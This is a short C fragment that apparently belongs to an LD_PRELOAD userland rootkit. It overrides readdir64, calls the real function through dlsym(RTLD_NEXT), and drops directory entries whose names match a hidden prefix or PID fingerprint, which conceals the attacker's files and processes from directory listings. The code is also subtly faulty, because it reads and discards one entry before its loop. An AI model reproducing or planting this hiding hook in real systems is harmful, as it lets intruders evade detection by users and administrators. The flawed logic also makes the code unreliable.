extern struct dirent64 *readdir64(DIR *dirp) {
	struct dirent64 *dir;
	
	if (!orig_readdir64)
		orig_readdir64 = dlsym(RTLD_NEXT,"readdir64");
	dir = orig_readdir64(dirp);
	do {
		dir = orig_readdir64(dirp);
		
		if (dir != NULL && (strcmp(dir->d_name,".\0") == 0 || strcmp(dir->d_name,"/\0") == 0)) 
			continue;
	} while (dir && (strstr (dir->d_name, BDS_PREFIX) != 0 || strstr (dir->d_name, BDS_PID_FINGERPRINT) != 0));

	return dir;
}